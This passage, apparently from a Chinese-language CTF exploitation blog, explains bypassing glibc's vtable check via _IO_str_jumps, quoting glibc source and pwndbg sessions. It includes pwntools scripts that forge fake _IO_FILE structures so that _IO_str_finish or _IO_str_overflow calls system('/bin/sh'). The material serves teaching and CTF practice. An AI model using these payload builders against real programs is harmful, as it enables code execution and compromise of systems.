__libc_IO_vtables</span><br><span class="hljs-comment">     section.  */</span><br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="hljs-comment">//offset 大于 section_length , 调用检查函数</span><br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-comment">/* Honor the compatibility flag.  */</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<span class="hljs-comment">//检查是否是外部重构的vtable</span><br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* In case this libc copy is in a non-default namespace, we always</span><br><span class="hljs-comment">     need to accept foreign vtables because there is always a</span><br><span class="hljs-comment">     possibility that FILE * objects are passed across the linking</span><br><span class="hljs-comment">     boundary.  */</span><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<span class="hljs-comment">//检查是否是动态链接库中的vtable</span><br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* !SHARED */</span></span><br>  <span class="hljs-comment">/* We cannot perform vtable validation in the static dlopen case</span><br><span class="hljs-comment">     because FILE * handles might be passed back and forth across the</span><br><span class="hljs-comment">     boundary.  Therefore, we disable checking in this case.  */</span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>上面这些没有用</strong>，主要眼熟一下这个，一般这个出来了说明你的 vtable 没 🐑 好，调试看看自己的数据有没有构造错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="经典俩大基本绕过思路"><a class="header-anchor" href="#经典俩大基本绕过思路">¶</a>经典俩大基本绕过思路</h4><p>因为加入了对 vtable 位置的检查，我们瞎几把劫持 vtable 的老一套已经没用了，但是基本利用思路还是盯着这个 <code>_IO_OVERFLOW</code> 。</p><p>不能写自己的 vtable ，那就找原本程序中就存在的 vtable，利用其中的函数指针。</p><p>目前主流思路就是利用 <code>_IO_str_jumps</code> 或 <code>_IO_wstr_jumps</code> 中的 <code>_IO_str_overflow()</code> 和 <code>_IO_str_finish()</code> 函数。</p><p>意思就是在 vtable 上写上 <code>_IO_str_jumps</code>  <strong>加减一段偏移</strong>来使得 IO 结构体在 <code>_IO_OVERFLOW</code> <strong>查 vtable 表时</strong>调用 <code>_IO_str_finish</code> 或 <code>_IO_str_overflow</code> 这类函数。</p><p>相比 2.23 ，最重要的就是<strong>对 <code>_flags</code> 比较严格</strong>，这里需要点篇幅看源码才能说明白。</p><h3 id="IO-str-jumps"><a class="header-anchor" href="#IO-str-jumps">¶</a>_IO_str_jumps</h3><p>就是一张 vtable 函数表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_str_finish),<br>  JUMP_INIT(overflow, _IO_str_overflow),<br>  JUMP_INIT(underflow, _IO_str_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>  JUMP_INIT(xsputn, _IO_default_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_str_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_default_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="IO-str-finish"><a class="header-anchor" href="#IO-str-finish">¶</a>_IO_str_finish</h3><p>这玩意比较简单，先说一下。</p><p>我们仍然需要构造好条件，进入被修改后的 vtable 表 <code>_IO_OVERFLOW</code> 偏移处的函数也就是我们这里的 <code>_IO_str_finish</code>。</p><p>所以 2.23 那里的<strong>条件还是不能丢</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>进入函数后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>好的，比较敏感的观众朋友们已经发现了华点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br></code></pre></td></tr></table></figure><p>这玩意，带了函数指针，很好用。只要把这个 <code>_free_buffer</code> 扬成 <code>system</code> ，<code>fp-&gt;_IO_buf_base</code> 写 <code>/bin/sh\0</code> 地址，剩下的 <strong>dddd</strong>。</p><p>这里 <strong>_s</strong> 是什么 👴 翻了一大半天源码也没弄明白这玩意，于是就摆了。反正 <code>fp-&gt;_s._free_buffer</code> 是 <strong>fp 加一个偏移</strong>。具体的 👴 有 gdb 可以调。👴 测得在 x64 下是 <strong>0xe8</strong>。</p><p>好的，总结一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span> <span class="hljs-comment">// 2.23</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base <span class="hljs-comment">// 2.23</span><br>fp-&gt;vtable = _IO_str_jumps_addr<br>fp-&gt;_flags &amp; _IO_USER_BUF = <span class="hljs-number">0</span> <span class="hljs-comment">// 最低位没有 1 </span><br>fp-&gt;_IO_buf_base != <span class="hljs-number">0</span><br>---&gt; fp-&gt;_IO_buf_base = binsh_addr<br>fp-&gt;_s._free_buffer = system_addr <br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br></code></pre></td></tr></table></figure><h3 id="IO-str-overflow"><a class="header-anchor" href="#IO-str-overflow">¶</a>_IO_str_overflow</h3><p>这是个比较复杂同时很重要的函数，后面我们也会用到这个函数（Hosue of Pig）。</p><p>我们仍然需要构造好条件，进入被修改后的 vtable 表 <code>_IO_OVERFLOW</code> 偏移处的函数也就是我们这里的 <code>_IO_str_overflow</code>。</p><p>所以 2.23 那里的<strong>条件还是不能丢</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>进入函数后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_str_overflow (_IO_FILE *fp, <span class="hljs-type">int</span> c)<br>&#123;<br>  <span class="hljs-type">int</span> flush_only = c == EOF;<br>  _IO_size_t pos;<br>    <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>    <br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br>    <br>  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br><span class="hljs-keyword">return</span> EOF;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-type">char</span> *new_buf;<br>  <span class="hljs-type">char</span> *old_buf = fp-&gt;_IO_buf_base;<br>  <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>  _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br>  <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>    <span class="hljs-keyword">return</span> EOF;<br>  new_buf<br>    = (<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br>  <span class="hljs-keyword">if</span> (new_buf == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/*  __ferror(fp) = 1; */</span><br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (old_buf)<br>    &#123;<br>      <span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);<br>      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);<br>      <span class="hljs-comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span><br>      fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  <span class="hljs-built_in">memset</span> (new_buf + old_blen, <span class="hljs-string">&#x27;\0&#x27;</span>, new_size - old_blen);<br><br>  _IO_setb (fp, new_buf, new_buf + new_size, <span class="hljs-number">1</span>);<br>  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);<br>  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);<br>  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);<br>  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);<br><br>  fp-&gt;_IO_write_base = new_buf;<br>  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (!flush_only)<br>    *fp-&gt;_IO_write_ptr++ = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) c;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)<br>    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">return</span> c;<br>&#125;<br>libc_hidden_def (_IO_str_overflow)<br></code></pre></td></tr></table></figure><p>👴 知道大 🔥 一眼望去直接不想看了，但是我们只需要盯几个点就好了。</p><p><strong>首先是我们的目标</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">new_buf = (<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br></code></pre></td></tr></table></figure><p><code>fp-&gt;_s._allocate_buffer</code> 写 system 的地址，<code>new_size</code> 构造成 binsh 的地址。</p><p>其中 <code>fp-&gt;_s._allocate_buffer</code> 是 fp 加一个偏移，👴 测得在 x64 下是 <strong>0xe0</strong>， new_size 计算如下：</p><p>当 binsh_addr 为<strong>偶数</strong>的话就是小学数学：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>  _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br></code></pre></td></tr></table></figure><p>$$<br>2 * old_blen + 100 = binsh_addr\<br>(fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base=\<br>old_blen=(binsh_addr-100)//2<br>$$</p><p>当 binsh_addr 为<strong>奇数</strong>（👴 没咋遇见过），咱加一试试看星不星，实在不行咱不受这气自己找地址写一个就  ok ：</p><p><code>0xa = 10</code> 是偶数，这里只是假装演示一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; search /<span class="hljs-built_in">bin</span>/sh<br>libc-<span class="hljs-number">2.27</span>.so    <span class="hljs-number">0x7f463b5cb0fa</span> <span class="hljs-number">0x68732f6e69622f</span> /* <span class="hljs-string">&#x27;/bin/sh&#x27;</span> */<br>pwndbg&gt; x/s <span class="hljs-number">0x7f463b5cb0fa</span>+<span class="hljs-number">1</span><br><span class="hljs-number">0x7f463b5cb0fb</span>: <span class="hljs-string">&quot;bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p><strong>然后是达成目标，使调用我们的函数指针，避免 return：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*[+]----------------1----------------[+]*/</span><br>    <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>    <br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br><span class="hljs-comment">/*[+]----------------1----------------[+]*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8 <span class="hljs-comment">/* Writing not allowd */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="hljs-comment">/* Set if put and get pointer logicly tied. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br></code></pre></td></tr></table></figure><p>即二进制表示的 <code>_flags</code> 倒数第三位不能为1 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*[+]----------------2----------------[+]*/</span><br>      <br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br><span class="hljs-keyword">return</span> EOF;<br>      <br><span class="hljs-comment">/*[+]----------------2----------------[+]*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br></code></pre></td></tr></table></figure><p>构造的时候小心点就好了，没啥大问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<br>    &#123;<br><span class="hljs-comment">/*[+]----------------3----------------[+]*/</span> <br>          <br>  <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>    <span class="hljs-keyword">return</span> EOF;<br>          <br><span class="hljs-comment">/*[+]----------------3----------------[+]*/</span><br></code></pre></td></tr></table></figure><p>1,2 咋构造？👴 说俩个数你记着嗷： <code>0xfbad1800</code>  或 <code>0</code> 直接绕完，不要搞花里胡哨的。</p><p>至于 4 ，这玩意应该是防止 <code>new_size = 2 * old_blen + 100</code> 溢出的。一般不会出事。</p><p><strong>总结一下：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><span class="hljs-comment">// 2.23</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<span class="hljs-comment">// 2.23</span><br>fp-&gt;_flags = <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr = <span class="hljs-number">0xffffffffffffffff</span><br>fp-&gt;_s._allocate_buffer = system_addr<br>fp-&gt;_IO_buf_base = <span class="hljs-number">0</span><br>fp-&gt;_IO_buf_end = (binsh_addr<span class="hljs-number">-100</span>)<span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><h3 id="基本构造-v2"><a class="header-anchor" href="#基本构造-v2">¶</a>基本构造</h3><h4 id="IO-str-finish-v2"><a class="header-anchor" href="#IO-str-finish-v2">¶</a>_IO_str_finish</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(binsh)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps-<span class="hljs-number">8</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(system)<br><span class="hljs-keyword">return</span> fake_IO_FILE<br><br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br></code></pre></td></tr></table></figure><h4 id="IO-str-overflow-v2"><a class="header-anchor" href="#IO-str-overflow-v2">¶</a>_IO_str_overflow</h4><p>其实上面那个就够用了，但防止有人说 👴 懒 🐶，👴 还是改了个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base; pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64((binsh-<span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps)<br>fake_IO_FILE += p64(system) <span class="hljs-comment"># 0xe0 _s._allocate_buffer</span><br><span class="hljs-keyword">return</span> fake_IO_FILE<br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br></code></pre></td></tr></table></figure><h3 id="如何定位-IO-str-jumps-？"><a class="header-anchor" href="#如何定位-IO-str-jumps-？">¶</a>如何定位 _IO_str_jumps ？</h3><p>👴 寻思 👴 有了 libc ，偏移又相对固定， 👴 更喜欢直接去 gdb 调试算。</p><p>下面这段是从别的师傅那<strong>CV</strong>的，不喜欢折腾的师傅们可以看下面的。</p><p>由于 <code>_IO_str_jumps</code> 不是导出符号，因此无法直接利用 pwntool s的 <code>libc.sym[&quot;_IO_str_jumps&quot;]</code> 进行定位，我们可以转换一下思路，利用 <code>_IO_str_jumps</code>中的导出函数，例如 <code>_IO_str_underflow</code> 进行辅助定位，我们可以利用gdb去查找所有包含这个<code>_IO_str_underflow</code> 函数地址的内存地址，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p _IO_str_underflow<br>$<span class="hljs-number">1</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="hljs-number">0x7f4d4cf04790</span> &lt;_IO_str_underflow&gt;<br>pwndbg&gt; search -p <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d2240a0</span> <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d224160</span> <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d2245e0</span> <span class="hljs-number">0x7f4d4cf04790</span><br>pwndbg&gt; p &amp;_IO_file_jumps<br>$<span class="hljs-number">2</span> = (&lt;data variable, no debug info&gt; *) <span class="hljs-number">0x7f4d4d224440</span> &lt;_IO_file_jumps&gt;<br></code></pre></td></tr></table></figure><p>再利用 <code>_IO_str_jumps</code> 的地址大于 <code>_IO_file_jumps</code> 地址的条件，就可以锁定最后一个地址为符合条件的 <code>_IO_str_jumps</code> 的地址，由于 <code>_IO_str_underflow</code> 在<code>_IO_str_jumps</code> 的偏移为0x20，我们可以计算出<code>_IO_str_jumps</code> = 0x7f4d4d2245c0，再减掉libc的基地址，就可以得到<code>_IO_str_jumps</code> 的正确偏移。 当然也可以用IDA <a href="http://xn--Prolibc-nk0l041n.so">Pro分析libc.so</a>，查找<code>_IO_file_jumps</code> 后的jump表即可。 此外，介绍一种直接利用pwntools得到<code>_IO_str_jumps</code> 